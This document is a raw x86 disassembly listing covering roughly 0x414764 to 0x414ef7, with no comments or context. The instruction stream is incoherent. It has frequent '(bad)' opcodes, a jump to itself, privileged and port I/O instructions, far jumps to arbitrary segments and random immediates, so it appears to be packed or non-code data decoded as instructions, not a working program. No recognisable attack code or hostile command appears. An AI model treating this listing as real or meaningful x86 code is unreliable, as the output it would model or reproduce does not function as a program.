  414764:	inc    edi
  414765:	sbb    bh,BYTE PTR [esi]
  414767:	dec    edi
  414768:	mov    BYTE PTR [ebx+0x10],bl
  41476b:	xchg   ebp,eax
  41476c:	jmp    0x41476c
  41476e:	adc    BYTE PTR [ebx],0x13
  414771:	add    ebx,DWORD PTR [ebx-0x6d2d1035]
  414777:	std    
  414778:	add    edi,0xdcc14d6a
  41477e:	dec    ebp
  41477f:	addr16 cmp eax,0x7a0502b9
  414785:	imul   esi,edx,0xe565d4f1
  41478b:	and    eax,0x566257b3
  414790:	retf   
  414791:	sub    ch,BYTE PTR [edi-0x15]
  414794:	fldenv [edx+esi*8]
  414797:	out    dx,al
  414798:	mov    WORD PTR [ebp-0x7f],fs
  41479b:	inc    esp
  41479c:	inc    edx
  41479d:	imul   ecx,DWORD PTR [esi],0x972d41eb
  4147a3:	pop    esp
  4147a4:	cmc    
  4147a5:	ins    BYTE PTR es:[edi],dx
  4147a6:	push   edi
  4147a7:	int3   
  4147a8:	clc    
  4147a9:	jmp    0x4147f2
  4147ab:	mov    dh,BYTE PTR ds:0x3dcd6560
  4147b1:	cs rol esp,cl
  4147b4:	sub    DWORD PTR [edi-0x3b2a2f58],ebx
  4147ba:	(bad)  
  4147bb:	and    eax,0xd24c2a0a
  4147c0:	xchg   ecx,eax
  4147c1:	cmp    eax,ebp
  4147c3:	or     DWORD PTR [edx],ebp
  4147c5:	sub    dl,ah
  4147c7:	mov    ?,WORD PTR [eax+0xc]
  4147ca:	push   cs
  4147cb:	fs push eax
  4147cd:	mov    ebp,DWORD PTR [esi]
  4147cf:	cmp    eax,0x1950079
  4147d4:	push   esi
  4147d5:	leave  
  4147d6:	cs (bad) 
  4147d9:	ds addr16 push esi
  4147dc:	push   esi
  4147dd:	mov    eax,0x4635659e
  4147e2:	mov    ah,0x13
  4147e4:	push   ss
  4147e5:	in     al,0x81
  4147e7:	enter  0x4587,0xcd
  4147eb:	xchg   BYTE PTR [edx-0x4e0df33f],bl
  4147f1:	sahf   
  4147f2:	xor    edx,DWORD PTR [eax+0x1]
  4147f5:	in     eax,0x1c
  4147f7:	push   ecx
  4147f8:	push   edi
  4147f9:	call   0x40b514ec
  4147fe:	loope  0x4147db
  414800:	dec    eax
  414801:	inc    edx
  414802:	imul   ebp,ebp,0xf348696b
  414808:	cmp    esp,DWORD PTR [ecx]
  41480a:	mov    bl,0x51
  41480c:	sbb    eax,0x96684265
  414811:	pop    ebp
  414812:	fs push ds
  414814:	inc    ebx
  414815:	pop    ds
  414816:	sbb    eax,DWORD PTR [eax-0xd448855]
  41481c:	or     DWORD PTR [ecx-0x1b],0x61
  414820:	dec    edx
  414821:	dec    esp
  414822:	push   ecx
  414823:	das    
  414824:	jae    0x41485f
  414826:	jmp    0xbb00:0x40e34a24
  41482d:	inc    esi
  41482e:	mov    ds:0xfc7af285,eax
  414833:	ror    DWORD PTR [ecx+0x54],cl
  414836:	sub    BYTE PTR ds:0xab546082,al
  41483c:	daa    
  41483d:	sti    
  41483e:	inc    esi
  41483f:	fbstp  TBYTE PTR [esi-0x6a574ec]
  414845:	add    esi,esi
  414847:	pop    ebp
  414848:	idiv   DWORD PTR [edi]
  41484a:	push   eax
  41484b:	rcl    dl,1
  41484d:	xchg   ecx,eax
  41484e:	add    eax,0xfd44e465
  414853:	rcl    BYTE PTR [ecx-0x475d6efd],0xd3
  41485a:	enter  0x58b1,0xf3
  41485e:	jbe    0x414810
  414860:	mov    esi,0x84ce19e3
  414865:	jmp    0x4148a0
  414867:	xor    bl,dh
  414869:	pop    ebx
  41486a:	jne    0x4148b4
  41486c:	nop
  41486d:	pop    ebx
  41486e:	inc    eax
  41486f:	leave  
  414870:	ret    
  414871:	push   edx
  414872:	xor    ebp,ecx
  414874:	jno    0x4148be
  414876:	fnstsw WORD PTR [edx+0x26]
  414879:	in     eax,0xe0
  41487b:	outs   dx,BYTE PTR ds:[esi]
  41487c:	sbb    al,0x70
  41487e:	aaa    
  41487f:	enter  0x57c1,0xd9
  414883:	inc    esp
  414884:	fisubr DWORD PTR [edx-0x5a0d9092]
  41488a:	or     BYTE PTR [ebx-0x40],dl
  41488d:	stos   BYTE PTR es:[edi],al
  41488e:	aad    0x8d
  414890:	aad    0xc8
  414892:	stc    
  414893:	push   ss
  414894:	loope  0x414887
  414896:	cmp    al,0x1f
  414898:	dec    ebx
  414899:	jo     0x414886
  41489b:	dec    esp
  41489c:	mov    dl,0xe5
  41489e:	cmp    al,0xef
  4148a0:	pop    ebx
  4148a1:	xchg   esp,eax
  4148a2:	shr    BYTE PTR [esp+esi*1-0x7aa69f54],1
  4148a9:	inc    ecx
  4148aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148ab:	pop    eax
  4148ac:	push   0xa1f55bcb
  4148b1:	sbb    BYTE PTR [esi-0x80],dl
  4148b4:	int    0x8c
  4148b6:	ret    0x5f33
  4148b9:	ins    BYTE PTR es:[edi],dx
  4148ba:	outs   dx,BYTE PTR ds:[esi]
  4148bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148bc:	jg     0x414868
  4148be:	adc    eax,0x3d2640c2
  4148c3:	stos   DWORD PTR es:[edi],eax
  4148c4:	dec    esp
  4148c5:	fisubr DWORD PTR [ebx+edx*4]
  4148c8:	jecxz  0x4148b3
  4148ca:	icebp  
  4148cb:	ds xor eax,edi
  4148ce:	mov    BYTE PTR [esi-0x32c01080],ch
  4148d4:	mov    WORD PTR [ebx],gs
  4148d6:	jne    0x414952
  4148d8:	mov    dl,0xa0
  4148da:	test   BYTE PTR [ecx],0xb6
  4148dd:	leave  
  4148de:	cmp    BYTE PTR [eax-0x675e50ea],0xd1
  4148e5:	push   ebp
  4148e6:	jmp    0x5c0b:0x231bc6d8
  4148ed:	mov    bh,0x81
  4148ef:	imul   edi,DWORD PTR [edi],0x26
  4148f2:	mov    edi,0x459b7f05
  4148f7:	test   eax,0x7c3ab67
  4148fc:	push   ebp
  4148fd:	jb     0x414937
  4148ff:	call   0x378916de
  414904:	mov    ds:0xa522d838,eax
  414909:	xor    esi,DWORD PTR [edi-0x6c065758]
  41490f:	xor    bh,BYTE PTR [edx-0x1b]
  414912:	fisubr DWORD PTR [esi-0xe]
  414915:	mov    sp,0xdbe8
  414919:	lods   eax,DWORD PTR ds:[esi]
  41491a:	pop    ecx
  41491b:	(bad)  
  41491c:	stos   DWORD PTR es:[edi],eax
  41491d:	fnstcw WORD PTR [esi]
  41491f:	imul   eax,DWORD PTR [edi+edx*8-0x7e],0x40
  414924:	sub    BYTE PTR [esi-0x71338185],cl
  41492a:	xor    bh,BYTE PTR [edx-0x247d3fec]
  414930:	loopne 0x414997
  414932:	xor    BYTE PTR [edi+0x28e79a7b],dh
  414938:	pop    esi
  414939:	fsubr  st(7),st
  41493b:	sub    cl,cl
  41493d:	push   eax
  41493e:	or     BYTE PTR [esi+0x52],bh
  414941:	pushf  
  414942:	rdtsc  
  414944:	lods   al,BYTE PTR ds:[esi]
  414945:	push   ss
  414946:	xchg   edi,eax
  414947:	mov    edx,0x1d8aa7f5
  41494c:	add    al,BYTE PTR [eax-0x86bb902]
  414952:	lods   eax,DWORD PTR ds:[esi]
  414953:	sub    ah,BYTE PTR [esi]
  414955:	fisubr DWORD PTR [ecx+0x6f80c513]
  41495b:	daa    
  41495c:	inc    esi
  41495d:	scas   eax,DWORD PTR es:[edi]
  41495e:	out    dx,eax
  41495f:	mov    ax,WORD PTR [ebx+0x53]
  414963:	push   edx
  414964:	and    cl,bh
  414966:	cmp    eax,0x538cfd28
  41496b:	mov    edx,0xce21fb7a
  414970:	xchg   edx,eax
  414971:	pop    es
  414972:	scas   al,BYTE PTR es:[edi]
  414973:	retf   0x6ded
  414976:	push   ebx
  414977:	in     al,dx
  414978:	es jb  0x414998
  41497b:	aad    0xaf
  41497d:	shl    BYTE PTR [ebx-0x6d],1
  414980:	cmp    al,0x6
  414982:	push   ds
  414983:	push   ecx
  414984:	lds    edi,FWORD PTR [edx]
  414986:	cdq    
  414987:	stos   BYTE PTR es:[edi],al
  414988:	out    0x1b,al
  41498a:	adc    DWORD PTR [ecx-0x7adb88dd],0x23301fe
  414994:	push   esp
  414995:	fwait
  414996:	mov    ebp,0xda1edae1
  41499b:	aaa    
  41499c:	xchg   BYTE PTR [esi],ah
  41499e:	stc    
  41499f:	sub    BYTE PTR [esi+0x3c1af9fb],0xc5
  4149a6:	pop    ebx
  4149a7:	int    0xbf
  4149a9:	cld    
  4149aa:	add    DWORD PTR [edx],edi
  4149ac:	push   0xde3e97a8
  4149b1:	and    eax,0x665f7b9c
  4149b6:	jnp    0x414a01
  4149b8:	mov    eax,ds:0x6d17bec7
  4149bd:	push   edx
  4149be:	sahf   
  4149bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149c0:	push   ecx
  4149c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149c2:	xor    DWORD PTR [esi+0x156d900a],0xb8ee6bdc
  4149cc:	je     0x4149e4
  4149ce:	push   0x53
  4149d0:	out    dx,eax
  4149d1:	enter  0x237d,0xdb
  4149d5:	sub    eax,0x51390ea3
  4149da:	cmp    BYTE PTR [esi],ah
  4149dc:	cwde   
  4149dd:	jmp    0x414a20
  4149df:	je     0x414a5a
  4149e1:	cmovno ebp,DWORD PTR [ebx+0x75]
  4149e5:	or     BYTE PTR [ebp+ebx*1-0x2c],0x9
  4149ea:	xchg   BYTE PTR [eax],cl
  4149ec:	adc    eax,0x4754e146
  4149f1:	bound  eax,QWORD PTR [edi+0x7f7b4bc8]
  4149f7:	xor    ebp,DWORD PTR [edi-0x78455f2a]
  4149fd:	inc    ebp
  4149fe:	ja     0x414a24
  414a00:	scas   eax,DWORD PTR es:[edi]
  414a01:	push   ds
  414a02:	xchg   ebx,eax
  414a03:	cmp    al,0xee
  414a05:	xchg   BYTE PTR [ebx+0x3d],ch
  414a08:	(bad)  [edi]
  414a0a:	jbe    0x414a68
  414a0c:	dec    esp
  414a0d:	call   0x568ee6d
  414a12:	clc    
  414a13:	ss int 0xdc
  414a16:	or     DWORD PTR [esi-0x57],0x89602524
  414a1d:	pop    eax
  414a1e:	adc    BYTE PTR [esp+ebx*4-0x4519c270],bh
  414a25:	or     ch,BYTE PTR [ebp+eax*8-0x7e]
  414a29:	stos   BYTE PTR es:[edi],al
  414a2a:	sbb    DWORD PTR [bx+si+0x56cf],edi
  414a2f:	clc    
  414a30:	aaa    
  414a31:	sbb    BYTE PTR [esi+0x76],al
  414a34:	pop    es
  414a35:	test   DWORD PTR [edi],esp
  414a37:	sbb    al,0x2b
  414a39:	jle    0x414a4a
  414a3b:	icebp  
  414a3c:	cmp    al,0x46
  414a3e:	pop    esi
  414a3f:	mov    ebp,0xacc53a6f
  414a44:	mov    dh,0x57
  414a46:	cmp    BYTE PTR [esp+edx*1],ah
  414a49:	xchg   ebp,eax
  414a4a:	fimul  WORD PTR [edx+0x3e]
  414a4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a4e:	je     0x4149ff
  414a50:	push   edi
  414a51:	cmp    esp,DWORD PTR [esi-0x3b34c25e]
  414a57:	jmp    0x18c0:0xf30b5b8a
  414a5e:	test   al,0x27
  414a60:	jbe    0x414a88
  414a62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a63:	adc    al,0x3b
  414a65:	test   al,0xbe
  414a67:	mov    dl,0xed
  414a69:	sar    DWORD PTR [ebp-0x73],0xd2
  414a6d:	cld    
  414a6e:	int3   
  414a6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a70:	or     al,0xe4
  414a72:	(bad)  
  414a73:	in     eax,0xf3
  414a75:	cld    
  414a76:	es sti 
  414a78:	fwait
  414a79:	repnz es sbb eax,0xea552d72
  414a80:	dec    esp
  414a81:	ds icebp 
  414a83:	push   esi
  414a84:	cdq    
  414a85:	xchg   edi,eax
  414a86:	mov    ds:0x98a05d2d,eax
  414a8b:	or     dl,ah
  414a8d:	add    al,0x9c
  414a8f:	ja     0x414a7a
  414a91:	mov    ecx,0x1ba95a6d
  414a96:	lock les esp,FWORD PTR [ebx]
  414a99:	or     DWORD PTR [ebp-0x38],esp
  414a9c:	loope  0x414a95
  414a9e:	or     dh,bh
  414aa0:	xor    DWORD PTR [edx+0x51],ecx
  414aa3:	(bad)  
  414aa4:	jmp    0x53d8:0x79fde573
  414aab:	pop    esp
  414aac:	pop    ecx
  414aad:	pop    edx
  414aae:	fisub  WORD PTR [ecx+0x58283768]
  414ab4:	lea    esi,[edx]
  414ab6:	mov    al,0xa8
  414ab8:	shl    BYTE PTR [eax+0x3e],cl
  414abb:	cmp    al,BYTE PTR ss:[ecx+0x5b948558]
  414ac2:	inc    ebx
  414ac3:	or     BYTE PTR [esi],bl
  414ac5:	outs   dx,DWORD PTR ds:[esi]
  414ac6:	push   esp
  414ac7:	push   0xffffff9a
  414ac9:	cmp    BYTE PTR [ebp+0x752da338],dh
  414acf:	(bad)  
  414ad0:	aad    0xd6
  414ad2:	retf   
  414ad3:	cs (bad) 
  414ad5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ad6:	int3   
  414ad7:	adc    esp,0x5442883d
  414add:	repz (bad) 
  414adf:	xor    al,BYTE PTR [edx-0x6]
  414ae2:	cmp    DWORD PTR [eax],eax
  414ae4:	outs   dx,BYTE PTR ds:[esi]
  414ae5:	addr16 push cs
  414ae7:	stc    
  414ae8:	aas    
  414ae9:	into   
  414aea:	sbb    eax,0x7cf2996e
  414aef:	cmp    ah,BYTE PTR [ecx]
  414af1:	xlat   BYTE PTR ds:[ebx]
  414af2:	idiv   ah
  414af4:	xchg   edi,eax
  414af5:	out    0x19,eax
  414af7:	inc    esp
  414af8:	call   0x1120cea9
  414afd:	in     eax,0x13
  414aff:	shl    DWORD PTR [eax+edx*4+0x55],0xf5
  414b04:	mov    ss,WORD PTR [edi]
  414b06:	lea    ebp,[edx]
  414b08:	add    edi,DWORD PTR [eax+ecx*1-0x1]
  414b0c:	(bad)  
  414b0d:	mov    bl,0xef
  414b0f:	add    eax,0x54940d5a
  414b14:	mov    DWORD PTR [ecx],edi
  414b16:	pop    esp
  414b17:	jge    0x414b6e
  414b19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b1a:	aaa    
  414b1b:	sub    DWORD PTR [edx+edx*2-0x5e],esi
  414b1f:	and    BYTE PTR [ebp+esi*4+0x119066c6],dl
  414b26:	sbb    eax,0xd94817f2
  414b2b:	mov    cl,0x3e
  414b2d:	fist   DWORD PTR [edx]
  414b2f:	mov    ebx,0xd65d2ade
  414b34:	adc    BYTE PTR [ecx-0x4cbe277b],bh
  414b3a:	mov    ds:0xa38e4062,eax
  414b3f:	adc    BYTE PTR [esi],ah
  414b41:	or     ebx,DWORD PTR [ebx-0x2567aa7b]
  414b47:	imul   esi,eax,0x8257e1de
  414b4d:	add    ebx,edx
  414b4f:	scas   eax,DWORD PTR es:[edi]
  414b50:	jns    0x414ba0
  414b52:	je     0x414bb0
  414b54:	fsubr  QWORD PTR [edi]
  414b56:	xor    edi,DWORD PTR [eax-0x2a]
  414b59:	pop    es
  414b5a:	mov    ch,0xe2
  414b5c:	mov    ds:0x3b564867,eax
  414b61:	push   ecx
  414b62:	pop    ecx
  414b63:	neg    cl
  414b65:	(bad)  
  414b66:	out    dx,al
  414b67:	sub    al,0xd9
  414b69:	adc    DWORD PTR [esp+eiz*4-0x70],0xffffffbc
  414b6e:	sbb    edx,DWORD PTR [ebx]
  414b70:	aam    0x6e
  414b72:	repnz into 
  414b74:	jmp    0x4cd9:0xd2e098a8
  414b7b:	mov    eax,ds:0x788806c3
  414b80:	push   esp
  414b81:	xor    DWORD PTR [edx],esp
  414b83:	adc    BYTE PTR [edx+0x1f90fd33],0x5b
  414b8a:	cmp    DWORD PTR [eax],ecx
  414b8c:	inc    ebx
  414b8d:	xor    dl,bl
  414b8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b90:	xor    DWORD PTR ds:0x423258ba,0x4e
  414b97:	addr16 mov edi,0x6bce2023
  414b9d:	mov    al,0x72
  414b9f:	daa    
  414ba0:	mov    dl,BYTE PTR [edx+0x28963420]
  414ba6:	adc    eax,0x16cf097d
  414bab:	mov    ds:0xfbcc0e6d,al
  414bb0:	popf   
  414bb1:	stos   DWORD PTR es:[edi],eax
  414bb2:	inc    edi
  414bb3:	fisub  WORD PTR [ebp-0x64]
  414bb6:	sbb    DWORD PTR [ecx+0x5f],ecx
  414bb9:	addr16 (bad) 
  414bbb:	xor    ch,al
  414bbd:	stos   DWORD PTR es:[edi],eax
  414bbe:	sbb    al,0xc8
  414bc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bc1:	jle    0x414bb7
  414bc3:	(bad)  
  414bc4:	retf   
  414bc5:	cmp    edx,esp
  414bc7:	xlat   BYTE PTR ds:[ebx]
  414bc8:	cwde   
  414bc9:	ja     0x414ba3
  414bcb:	dec    edi
  414bcc:	adc    al,0xfe
  414bce:	aam    0x58
  414bd0:	push   0xf9a88c79
  414bd5:	dec    ebx
  414bd6:	or     edi,edi
  414bd8:	stos   DWORD PTR es:[edi],eax
  414bd9:	fistp  DWORD PTR [ebp-0x79]
  414bdc:	fist   WORD PTR [ebx-0x35]
  414bdf:	mov    ch,dh
  414be1:	cld    
  414be2:	push   es
  414be3:	test   al,0xf5
  414be5:	gs test ebx,edi
  414be8:	inc    esp
  414be9:	clc    
  414bea:	push   0x69e3caac
  414bef:	mov    cl,0x6
  414bf1:	fnsave [ecx+0x6086c3a]
  414bf7:	sub    ebp,esi
  414bf9:	mov    ecx,0xd6e14258
  414bfe:	adc    eax,0x176213a
  414c03:	sti    
  414c04:	jecxz  0x414c41
  414c06:	jno    0x414c3b
  414c08:	dec    edi
  414c09:	scas   eax,DWORD PTR es:[edi]
  414c0a:	cmp    ch,BYTE PTR [ecx-0x3c]
  414c0d:	and    eax,0x7a0149a4
  414c12:	js     0x414c8a
  414c14:	mov    ds:0x31bac0ff,eax
  414c19:	jne    0xcaae4aa4
  414c1f:	sar    DWORD PTR [ebp+0x10],0xb7
  414c23:	push   edi
  414c24:	mov    ds:0x7042c133,al
  414c29:	(bad)  
  414c2a:	jmp    0xfd2f3787
  414c2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c30:	retf   
  414c31:	or     bh,BYTE PTR [esi-0x4]
  414c34:	xor    al,0x55
  414c36:	xor    al,0xa6
  414c38:	mov    BYTE PTR [edx],dh
  414c3a:	mov    DWORD PTR [esp+ebx*2+0x4ce0536c],ebx
  414c41:	retf   0x58a1
  414c44:	cli    
  414c45:	dec    esp
  414c46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c47:	inc    ebx
  414c48:	out    dx,eax
  414c49:	or     DWORD PTR [edi-0x22],ebx
  414c4c:	pop    esi
  414c4d:	mov    al,BYTE PTR [ecx+edi*4+0x20956d84]
  414c54:	in     eax,0x52
  414c56:	add    al,ch
  414c58:	or     DWORD PTR [ecx+0x2f35a788],esp
  414c5e:	or     DWORD PTR [edi],ebx
  414c60:	cli    
  414c61:	mov    eax,0x40c476af
  414c66:	ror    DWORD PTR [eax],0xae
  414c69:	rcr    BYTE PTR [edi-0x38],1
  414c6c:	clc    
  414c6d:	popf   
  414c6e:	inc    eax
  414c6f:	(bad)  
  414c70:	lods   al,BYTE PTR ds:[esi]
  414c71:	push   ds
  414c72:	mov    cl,ah
  414c74:	pop    edi
  414c75:	das    
  414c76:	pop    ss
  414c77:	leave  
  414c78:	dec    esp
  414c79:	popa   
  414c7a:	iret   
  414c7b:	stos   BYTE PTR es:[edi],al
  414c7c:	pop    ebp
  414c7d:	jmp    0xbc805d6a
  414c82:	add    DWORD PTR [ebp+ebx*8+0x6d35d3df],0xd006dd7e
  414c8d:	in     eax,dx
  414c8e:	sub    eax,DWORD PTR [edi]
  414c90:	std    
  414c91:	(bad)  
  414c93:	stos   DWORD PTR es:[edi],eax
  414c94:	mov    ds:0x69b3429,eax
  414c99:	test   DWORD PTR [ecx+ecx*8-0x13],ebx
  414c9d:	clc    
  414c9e:	cld    
  414c9f:	cli    
  414ca0:	cmp    eax,0xc730e0e5
  414ca5:	ret    
  414ca6:	mov    ch,BYTE PTR [ecx+0x74]
  414ca9:	stos   DWORD PTR es:[edi],eax
  414caa:	cmp    cl,BYTE PTR [eax-0x1d]
  414cad:	idiv   BYTE PTR [esi+0x54]
  414cb0:	add    al,BYTE PTR [eax+0x64]
  414cb3:	(bad)  
  414cb4:	fs pop ss
  414cb6:	pop    edx
  414cb7:	shl    DWORD PTR [esp+edi*8-0x53b1c9d2],cl
  414cbe:	pop    edx
  414cbf:	xor    eax,0x62a232f
  414cc4:	pop    ds
  414cc5:	or     ch,bl
  414cc7:	or     BYTE PTR es:[edi-0x48],ah
  414ccb:	ja     0x414c86
  414ccd:	sbb    eax,0xbb954358
  414cd2:	lahf   
  414cd3:	(bad)  
  414cd4:	icebp  
  414cd5:	jo     0x414d32
  414cd7:	pop    edi
  414cd8:	inc    ecx
  414cd9:	test   al,0xb9
  414cdb:	(bad)  
  414cdc:	pop    ebx
  414cdd:	rol    DWORD PTR [ebp+0x68cef8da],cl
  414ce3:	lahf   
  414ce4:	xchg   BYTE PTR [esi+0x5c36ac71],cl
  414cea:	inc    eax
  414ceb:	xchg   ecx,eax
  414cec:	(bad)  
  414ced:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cee:	popf   
  414cef:	sub    eax,0x84ca9f43
  414cf4:	cmp    al,0x51
  414cf6:	xchg   esi,eax
  414cf7:	sahf   
  414cf8:	add    esi,DWORD PTR [ecx-0x1914f9ef]
  414cfe:	jno    0x414d4c
  414d00:	cmp    ah,BYTE PTR [eax+0x13848f34]
  414d06:	ins    BYTE PTR es:[edi],dx
  414d07:	jmp    0x414d3c
  414d09:	and    al,0x7b
  414d0b:	mov    dl,BYTE PTR [edi]
  414d0d:	xor    eax,DWORD PTR ds:0x160df613
  414d13:	lods   al,BYTE PTR ds:[esi]
  414d14:	leave  
  414d15:	repz retf 
  414d17:	or     al,0x3f
  414d19:	ins    DWORD PTR es:[edi],dx
  414d1a:	push   edi
  414d1b:	and    BYTE PTR [edx+0x613bbb03],ah
  414d21:	adc    al,0x3d
  414d23:	sbb    DWORD PTR [ecx-0x70624b62],0xa
  414d2a:	js     0x59c26c7
  414d30:	call   0x9f54:0x676a0854
  414d37:	fidivr WORD PTR [eax+esi*2-0x78]
  414d3b:	xchg   BYTE PTR [esi],ah
  414d3d:	ss and ch,ah
  414d40:	fdiv   DWORD PTR [ebp-0x3c]
  414d43:	nop
  414d44:	call   0x1d069a8c
  414d49:	mov    ah,0xe8
  414d4b:	push   ecx
  414d4c:	dec    eax
  414d4d:	pop    ecx
  414d4e:	(bad)  
  414d4f:	shl    BYTE PTR [edx+ebx*2-0x14],1
  414d53:	lods   al,BYTE PTR ds:[esi]
  414d54:	rol    BYTE PTR [esp+edx*2-0xf],0x5a
  414d59:	retf   
  414d5a:	xor    BYTE PTR [eax+0x10],0xfd
  414d5e:	lods   eax,DWORD PTR ds:[esi]
  414d5f:	cmp    ebp,DWORD PTR [ebx-0x4a]
  414d62:	in     eax,dx
  414d63:	dec    eax
  414d64:	or     al,0xca
  414d66:	pop    ebx
  414d67:	xchg   esi,eax
  414d68:	test   al,0xa4
  414d6a:	and    BYTE PTR [ecx-0x75],ch
  414d6d:	out    dx,eax
  414d6e:	test   ax,0xbd64
  414d72:	adc    DWORD PTR [edx+0x19],0xd
  414d76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d77:	jnp    0x414d01
  414d79:	sbb    dl,BYTE PTR es:[ebp-0x1c]
  414d7d:	aaa    
  414d7e:	in     al,dx
  414d7f:	out    0xe3,al
  414d81:	mov    DWORD PTR [ecx-0x512ef2e0],ebx
  414d87:	xsave  [ecx+0xc21295e]
  414d8e:	add    BYTE PTR [ecx+ebx*1+0x7d7b29a2],bl
  414d95:	jl     0x414d25
  414d97:	mov    eax,ds:0x8478611e
  414d9d:	xor    eax,0xb06ae0bf
  414da2:	std    
  414da3:	mov    al,ds:0xe2be7b90
  414da8:	lods   al,BYTE PTR ds:[esi]
  414da9:	cmp    BYTE PTR [esi+0x31],dl
  414dac:	xlat   BYTE PTR ds:[ebx]
  414dad:	xlat   BYTE PTR ds:[ebx]
  414dae:	sbb    ebp,esi
  414db0:	or     DWORD PTR [edi],edx
  414db2:	fld    DWORD PTR [eax+0x3f]
  414db5:	pop    edi
  414db6:	xchg   esi,eax
  414db7:	fs out dx,al
  414db9:	jle    0x414d81
  414dbb:	out    dx,al
  414dbc:	dec    ecx
  414dbd:	jo     0x414e13
  414dbf:	enter  0x72f3,0xeb
  414dc3:	adc    al,bh
  414dc5:	icebp  
  414dc6:	(bad)  
  414dc7:	inc    BYTE PTR [ecx]
  414dc9:	rcr    DWORD PTR cs:[ebx+0x7b],0xaf
  414dce:	repz or DWORD PTR [esi+0x6cd61720],0x34
  414dd6:	mov    ebp,0xef7376c2
  414ddb:	ret    0xa05d
  414dde:	ss push edi
  414de0:	fisubr DWORD PTR [esi+0x2b59b06a]
  414de6:	sbb    DWORD PTR [edi+0x59],ecx
  414de9:	dec    DWORD PTR cs:[edx+0x57c21e6a]
  414df0:	fcmove st,st(4)
  414df2:	xchg   edx,eax
  414df3:	aad    0xbe
  414df5:	in     eax,dx
  414df6:	addr16 hlt 
  414df8:	dec    ebx
  414df9:	cmp    al,0x3c
  414dfb:	pop    eax
  414dfc:	xchg   edx,eax
  414dfd:	aas    
  414dfe:	dec    eax
  414dff:	add    eax,0x53cbf5a2
  414e04:	in     eax,dx
  414e05:	cld    
  414e06:	pop    esi
  414e07:	shl    DWORD PTR ss:[ecx-0x718d4354],0x1e
  414e0f:	jbe    0x414dcc
  414e11:	add    al,0x89
  414e13:	push   ds
  414e14:	and    al,BYTE PTR [ebp-0x79]
  414e17:	mov    bh,BYTE PTR [eax]
  414e19:	adc    DWORD PTR [ebx],ecx
  414e1b:	inc    eax
  414e1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e1d:	int3   
  414e1e:	mov    dl,0xd9
  414e20:	lock stc 
  414e22:	or     bh,BYTE PTR [ecx+0x2b330567]
  414e28:	cmc    
  414e29:	push   cs
  414e2a:	int3   
  414e2b:	ret    
  414e2c:	sbb    ah,BYTE PTR [ebp+0x2874351b]
  414e32:	test   BYTE PTR [ebx-0x47],dh
  414e35:	xchg   edi,eax
  414e36:	push   0x8
  414e38:	ret    
  414e39:	jno    0x414e63
  414e3b:	pop    edx
  414e3c:	shr    DWORD PTR [ebx],1
  414e3e:	dec    edx
  414e3f:	popf   
  414e40:	ins    DWORD PTR es:[di],dx
  414e42:	sub    bl,BYTE PTR [esi]
  414e44:	iret   
  414e45:	(bad)  
  414e46:	js     0x414ea4
  414e48:	adc    al,0xab
  414e4a:	bound  ebx,QWORD PTR ds:0x28804e6f
  414e50:	or     al,0x30
  414e52:	lahf   
  414e53:	cmp    bh,BYTE PTR [ebx-0x6e72a1d7]
  414e59:	call   0xca9d:0x7887cdcc
  414e60:	loopne 0x414e2f
  414e62:	call   0xe651:0x78a520b1
  414e69:	mov    ebx,0xd919dd66
  414e6e:	adc    ebx,DWORD PTR [ecx+0x7a]
  414e71:	(bad)  
  414e72:	mov    al,ds:0x48cbe8cc
  414e77:	(bad)  
  414e78:	gs data16 jmp 0x414e5d
  414e7c:	popf   
  414e7d:	push   cs
  414e7e:	pop    edx
  414e7f:	loope  0x414e4d
  414e81:	jbe    0x414e51
  414e83:	xchg   ebp,eax
  414e84:	pop    ds
  414e85:	xchg   edi,eax
  414e86:	jl     0x414e82
  414e88:	jbe    0x414eea
  414e8a:	jl     0x414ef8
  414e8c:	xchg   esi,eax
  414e8d:	(bad)  
  414e8e:	mov    ah,0x5d
  414e90:	out    dx,eax
  414e91:	jecxz  0x414ec2
  414e93:	sbb    eax,0x47225406
  414e98:	adc    eax,0xcdc0d8d
  414e9d:	sub    ah,BYTE PTR [esi+eax*4]
  414ea0:	push   es
  414ea1:	cmp    DWORD PTR [ebp+0x4e],ecx
  414ea4:	test   eax,0xa659f719
  414ea9:	cld    
  414eaa:	out    dx,eax
  414eab:	fimul  WORD PTR [esi+0x4d]
  414eae:	push   ebp
  414eaf:	scas   eax,DWORD PTR es:[edi]
  414eb0:	mov    al,ds:0x7346c9e9
  414eb5:	mov    al,0x1
  414eb7:	daa    
  414eb8:	xor    edx,edx
  414eba:	dec    ebp
  414ebb:	(bad)  
  414ebc:	scas   al,BYTE PTR es:[edi]
  414ebd:	int    0x73
  414ebf:	add    dh,ch
  414ec1:	push   esi
  414ec2:	es pop ds
  414ec4:	push   ebx
  414ec5:	xlat   BYTE PTR ds:[ebx]
  414ec6:	add    eax,0x5203996e
  414ecb:	scas   al,BYTE PTR es:[edi]
  414ecc:	inc    esi
  414ecd:	adc    eax,0xfb2d5b1e
  414ed2:	pop    edi
  414ed3:	add    dl,BYTE PTR [ecx-0x55]
  414ed6:	adc    BYTE PTR [ecx],0x29
  414ed9:	mov    edx,0xe00da804
  414ede:	add    edx,DWORD PTR [ecx-0x6]
  414ee1:	mov    WORD PTR [edi-0x74],es
  414ee4:	int3   
  414ee5:	scas   eax,DWORD PTR es:[edi]
  414ee6:	xchg   DWORD PTR [ebx+edi*2+0x28],edx
  414eea:	rol    DWORD PTR [ecx+0xc],1
  414eed:	sub    BYTE PTR [ecx+0x4f],al
  414ef0:	mov    eax,ds:0xff49720c
  414ef5:	mov    al,0x1d
  414ef7:	jb     0x414f62
